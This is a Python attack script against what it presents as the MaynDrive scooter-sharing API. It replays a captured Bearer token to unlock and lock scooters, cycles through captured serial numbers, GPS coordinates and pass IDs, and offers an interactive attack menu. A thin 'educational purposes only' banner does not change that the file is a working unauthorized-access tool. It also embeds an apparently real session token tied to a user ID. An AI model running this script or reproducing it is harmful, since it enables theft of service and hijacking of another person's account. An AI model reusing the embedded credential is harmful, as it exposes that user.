#!/usr/bin/env python3
"""
Correct MaynDrive Attack Script
Uses captured Bearer token with CORRECT API parameters
"""

import requests
import json
import time
from datetime import datetime

# Captured data from your session
BEARER_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"

# CORRECT API endpoints
BASE_URL = "https://api.knotcity.io"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

# Headers
HEADERS = {
    "Authorization": BEARER_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
    "Accept": "application/json"
}

# Your captured data
CAPTURED_SCOOTERS = [
    {
        "serial_number": "kh.d@61f7c2e",
        "lat": 47.39027698832425,
        "lng": 0.6889144890010357
    },
    {
        "serial_number": "kh.d@c732fd5", 
        "lat": 47.43510309622584,
        "lng": 0.6889144890010357
    }
]

CAPTURED_PASS_IDS = ["qb.q@9243539", "u.S@e081b42", "37", "922"]

def test_token_validity():
    """Test if the captured token is still valid"""
    print("🔍 Testing token validity...")
    
    # Try a simple endpoint first
    try:
        response = requests.get(f"{BASE_URL}/api/application/vehicles", headers=HEADERS, timeout=10)
        print(f"   Status: {response.status_code}")
        if response.status_code in [200, 404]:  # 404 means endpoint exists but wrong path
            print("✅ Token appears to be VALID!")
            return True
        else:
            print(f"❌ Token invalid: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error testing token: {e}")
        return False

def attack_unlock(serial_number, lat, lng):
    """Attempt to unlock a vehicle with correct parameters"""
    print(f"🔓 Attempting to unlock scooter: {serial_number}")
    print(f"   Location: {lat}, {lng}")
    
    payload = {
        "serial_number": serial_number,
        "lat": lat,
        "lng": lng
    }
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=10)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ UNLOCK SUCCESSFUL!")
            return True
        elif response.status_code == 400:
            print("❌ Unlock failed - Bad request (invalid parameters)")
            return False
        else:
            print(f"❌ Unlock failed - Status: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error during unlock: {e}")
        return False

def attack_lock(vehicle_id, pass_id=None):
    """Attempt to lock a vehicle"""
    print(f"🔒 Attempting to lock vehicle: {vehicle_id}")
    if pass_id:
        print(f"   Using Pass ID: {pass_id}")
    
    payload = {
        "vehicle_id": vehicle_id
    }
    
    if pass_id:
        payload["pass_id"] = pass_id
    
    try:
        response = requests.post(f"{BASE_URL}{LOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=10)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ LOCK SUCCESSFUL!")
            return True
        elif response.status_code == 400:
            print("❌ Lock failed - Bad request (invalid parameters)")
            return False
        else:
            print(f"❌ Lock failed - Status: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error during lock: {e}")
        return False

def test_captured_scooters():
    """Test with the captured scooter data"""
    print("🎯 Testing with captured scooter data...")
    
    for i, scooter in enumerate(CAPTURED_SCOOTERS):
        print(f"\n--- Testing scooter {i+1}: {scooter['serial_number']} ---")
        
        # Try unlock
        print("Testing unlock...")
        success = attack_unlock(
            scooter['serial_number'], 
            scooter['lat'], 
            scooter['lng']
        )
        
        if success:
            time.sleep(2)
            # Try lock with different pass IDs
            for pass_id in CAPTURED_PASS_IDS:
                print(f"Testing lock with pass_id: {pass_id}")
                attack_lock(scooter['serial_number'], pass_id)
                time.sleep(1)
        
        time.sleep(2)

def test_different_parameters():
    """Test with various parameter combinations"""
    print("🧪 Testing different parameter combinations...")
    
    # Test different serial number formats
    test_serials = [
        "kh.d@61f7c2e",
        "61f7c2e", 
        "TUF061",
        "TUF062"
    ]
    
    for serial in test_serials:
        print(f"\n--- Testing serial: {serial} ---")
        attack_unlock(serial, 47.39027698832425, 0.6889144890010357)
        time.sleep(1)

def main():
    print("=" * 60)
    print("🚨 MAYNDRIVE SECURITY EXPLOITATION DEMO (CORRECT)")
    print("=" * 60)
    print("⚠️  WARNING: This is for educational purposes only!")
    print("⚠️  Only use on vehicles you own or have permission to test!")
    print("=" * 60)
    print("Using CORRECT API parameters based on error analysis")
    print("=" * 60)
    
    # Test token first
    if not test_token_validity():
        print("❌ Cannot proceed - token is invalid or expired")
        return
    
    print("\n" + "=" * 60)
    print("🎯 ATTACK OPTIONS")
    print("=" * 60)
    print("1. Test with captured scooter data")
    print("2. Test different parameter combinations")
    print("3. Manual unlock test")
    print("4. Manual lock test")
    print("5. Exit")
    
    while True:
        try:
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                test_captured_scooters()
                    
            elif choice == "2":
                test_different_parameters()
                
            elif choice == "3":
                serial = input("Enter serial_number: ").strip()
                lat = float(input("Enter latitude: ").strip())
                lng = float(input("Enter longitude: ").strip())
                attack_unlock(serial, lat, lng)
                    
            elif choice == "4":
                vehicle_id = input("Enter vehicle_id: ").strip()
                pass_id = input("Enter pass_id (optional): ").strip() or None
                attack_lock(vehicle_id, pass_id)
                
            elif choice == "5":
                print("👋 Goodbye!")
                break
                
            else:
                print("Invalid choice. Please select 1-5.")
                
        except KeyboardInterrupt:
            print("\n👋 Goodbye!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
